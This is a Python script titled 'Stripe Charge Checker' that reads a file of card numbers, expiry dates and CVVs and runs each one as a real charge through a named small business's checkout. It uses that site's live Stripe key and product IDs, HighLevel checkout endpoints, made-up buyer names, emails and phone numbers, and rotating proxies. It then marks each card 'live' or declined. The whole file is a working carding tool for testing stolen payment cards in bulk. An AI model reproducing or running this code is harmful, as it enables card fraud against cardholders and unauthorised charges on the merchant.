"""
Stripe Charge Checker — charges through gospelpianosimple.com/checkout
"""
import asyncio
import re
import json
import random
import uuid
import warnings
import aiohttp
from datetime import datetime

warnings.filterwarnings('ignore')

# ────────────────────────── site config (pre-extracted) ──────────────

STRIPE_KEY = "pk_live_MtxwO3obi7pfD7UZlGkfR2yj"
LOCATION_ID = "aIfbkdsjbDMNd2jXVzkv"
PRODUCT_ID = "698502efdd3a3371f5ffba3f"
STRIPE_PRICE_ID = "price_1SyLQ2HGUqx8Rh4ctWH7LU6f"
CHECKOUT_URL = "https://gospelpianosimple.com/checkout"
DOMAIN = "https://gospelpianosimple.com"


# ────────────────────────── helpers ──────────────────────────────────

def generate_guid():
    return str(uuid.uuid4())


def generate_random_email():
    import string
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"


def generate_random_phone():
    area = random.randint(200, 999)
    prefix = random.randint(200, 999)
    line = random.randint(1000, 9999)
    return f"+1{area}{prefix}{line}"


def parse_proxy_line(line: str):
    line = line.strip()
    if not line:
        return None
    protocol = 'http'
    if '://' in line:
        protocol, rest = line.split('://', 1)
    else:
        rest = line
    auth = None
    address = None
    if '@' in rest:
        left, right = rest.split('@', 1)
        if ':' in left and ':' not in right:
            auth = left
            address = right
        elif ':' in right and ':' not in left:
            address = left
            auth = right
        else:
            auth = left
            address = right
    else:
        parts = rest.split(':')
        if len(parts) == 2:
            host, port = parts
            address = f"{host}:{port}"
        elif len(parts) == 4:
            host, port, user, pwd = parts
            auth = f"{user}:{pwd}"
            address = f"{host}:{port}"
        else:
            return None
    if auth:
        proxy_url = f"{protocol}://{auth}@{address}"
    else:
        proxy_url = f"{protocol}://{address}"
    return proxy_url


# ──────────────────────── Stripe charge logic ───────────────────────

async def process_stripe_charge(card_data, proxy_url=None):
    """
    Create a PaymentMethod via Stripe API and submit to HighLevel checkout.
    Returns: (is_approved, response_message, charge_data_dict)
    """
    # Hard timeout so we never hang
    timeout = aiohttp.ClientTimeout(total=45)
    connector = aiohttp.TCPConnector(ssl=False)

    async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
        try:
            # ── Step 1: Create PaymentMethod via Stripe API ──────
            ua = ('Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                  'AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36')

            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': ua,
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'billing_details[address][country]': 'US',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': STRIPE_KEY,
                'payment_user_agent': 'stripe.js/5e27053bf5',
                '_stripe_version': '2024-06-20',
            }

            async with session.post(
                'https://api.stripe.com/v1/payment_methods',
                headers=stripe_headers,
                data=stripe_data,
                proxy=proxy_url,
            ) as pm_resp:
                pm_json = await pm_resp.json()

            if 'error' in pm_json:
                err_msg = pm_json['error'].get('message', 'Stripe PM error')
                return False, f"Stripe: {err_msg}", pm_json

            pm_id = pm_json.get('id')
            if not pm_id:
                return False, "Stripe: failed to create Payment Method", pm_json

            # Extract card info
            card_info = pm_json.get('card', {})

            # ── Step 2: Submit to checkout API ──────────────────
            name = f"John {random.choice(['Smith','Doe','Brown','Lee','Wilson'])}"
            email = generate_random_email()
            phone = generate_random_phone()

            payload = {
                'paymentMethodId': pm_id,
                'fullName': name,
                'email': email,
                'phone': phone,
                'locationId': LOCATION_ID,
                'productId': PRODUCT_ID,
                'priceId': STRIPE_PRICE_ID,
                'currency': 'usd',
            }

            headers_json = {
                'accept': 'application/json, text/plain, */*',
                'content-type': 'application/json',
                'origin': DOMAIN,
                'referer': CHECKOUT_URL,
                'user-agent': ua,
            }

            # Try HighLevel checkout endpoints
            endpoints = [
                ('https://services.leadconnectorhq.com/checkout/session', True),
                ('https://rest.gohighlevel.com/v1/checkout/session', True),
                ('https://services.leadconnectorhq.com/checkout/v2/session', True),
            ]

            for url, use_json in endpoints:
                try:
                    if use_json:
                        async with session.post(
                            url, json=payload, headers=headers_json, proxy=proxy_url,
                        ) as resp:
                            if resp.status < 500:
                                result = await resp.json()
                                charge_id = (result.get('charge') or
                                            result.get('chargeId') or
                                            result.get('id') or '')
                                status = result.get('status', '')
                                if charge_id or 'succeeded' in str(status).lower():
                                    return True, f"Approved (Charge: {charge_id})", result
                                err = (result.get('error', {}).get('message') or
                                       result.get('message') or
                                       json.dumps(result)[:200])
                                return False, err, result
                except (asyncio.TimeoutError, aiohttp.ClientError):
                    continue
                except Exception:
                    continue

            # ── Step 3: Fallback — direct form POST to checkout URL
            form_headers = {
                'accept': '*/*',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': DOMAIN,
                'referer': CHECKOUT_URL,
                'user-agent': ua,
                'x-requested-with': 'XMLHttpRequest',
            }
            form_data = {
                'paymentMethodId': pm_id,
                'fullName': name,
                'email': email,
                'phone': phone,
                'locationId': LOCATION_ID,
                'productId': PRODUCT_ID,
            }
            try:
                async with session.post(
                    CHECKOUT_URL, data=form_data, headers=form_headers, proxy=proxy_url,
                ) as resp:
                    text = await resp.text()
                    try:
                        result = json.loads(text)
                        charge_id = result.get('charge', result.get('chargeId', ''))
                        if charge_id:
                            return True, f"Approved (Charge: {charge_id})", result
                        err = result.get('error', {}).get('message', result.get('message', 'Declined'))
                        return False, err, result
                    except json.JSONDecodeError:
                        return False, f"Declined (HTTP {resp.status})", {'raw': text[:200]}
            except Exception as e:
                return False, f"System Error: {str(e)}", {}

            return False, "All endpoints failed — no charge attempted", {}

        except asyncio.TimeoutError:
            return False, "System Error: Request timed out", {}
        except Exception as e:
            return False, f"System Error: {str(e)}", {}


async def check_card(cc, mes, ano, cvv, proxy=None):
    """Single card charge check. Returns dict with result."""
    card_data = {'number': cc, 'exp_month': mes, 'exp_year': ano, 'cvc': cvv}
    is_approved, response_msg, charge_data = await process_stripe_charge(
        card_data, proxy_url=proxy
    )
    is_live = is_approved or any(kw in response_msg.lower()
                                  for kw in ['approved', 'succeeded', 'charge: ch_'])

    card_info = {}
    if isinstance(charge_data, dict):
        card_info = {
            'brand': charge_data.get('card', {}).get('brand', ''),
            'last4': charge_data.get('card', {}).get('last4', ''),
            'funding': charge_data.get('card', {}).get('funding', ''),
        }

    charge_id = ''
    if isinstance(charge_data, dict):
        charge_id = charge_data.get('charge', charge_data.get('chargeId', ''))

    return {
        'cc': f"{cc}|{mes}|{ano}|{cvv}",
        'is_live': is_live,
        'response': response_msg,
        'charge_id': charge_id,
        'card_info': card_info,
    }


# ─────────────────────── mass checker ────────────────────────────────

async def mass_check(file_path, proxies=None, concurrency=10, progress_callback=None):
    if proxies is None:
        proxies = []

    cc_lines = []
    try:
        with open(file_path, 'r') as f:
            for line in f:
                line = line.strip()
                if line:
                    cc_lines.append(line)
    except FileNotFoundError:
        print("File not found: %s" % file_path)
        return []

    if not cc_lines:
        print("No cards to check.")
        return []

    sem = asyncio.Semaphore(concurrency)
    results = [None] * len(cc_lines)
    completed = 0

    async def worker(index, cc_line):
        nonlocal completed
        async with sem:
            parts = cc_line.strip().split('|')
            if len(parts) != 4:
                result = {
                    'cc': cc_line,
                    'is_live': False,
                    'response': 'Invalid format (need cc|mm|yy|cvv)',
                    'charge_id': '',
                }
            else:
                cc, mes, ano, cvv = parts
                max_retries = 3 if proxies else 1
                used_proxies = set()
                result = None
                for attempt in range(max_retries):
                    available = [p for p in proxies if p not in used_proxies] if proxies else []
                    proxy = random.choice(available) if available else (
                        random.choice(proxies) if proxies else None)
                    if proxy:
                        used_proxies.add(proxy)
                    result = await check_card(cc, mes, ano, cvv, proxy=proxy)
                    resp = result.get('response', '') or ''
                    if 'System Error' in resp and attempt < max_retries - 1:
                        await asyncio.sleep(1)
                        continue
                    break

            results[index] = result
            completed += 1
            emoji = "[+]" if result['is_live'] else "[-]"
            print("[%d/%d] %s %s - %s" % (completed, len(cc_lines), emoji, result['cc'],
                                           result['response']))
            if progress_callback:
                await progress_callback(result, completed, len(cc_lines))
            return result

    tasks = [asyncio.create_task(worker(i, line)) for i, line in enumerate(cc_lines)]
    await asyncio.gather(*tasks)
    results = [r for r in results if r is not None]

    approved = sum(1 for r in results if r.get('is_live'))
    declined = len(results) - approved
    print("\nMass Check Finished: %d approved, %d declined" % (approved, declined))
    return results
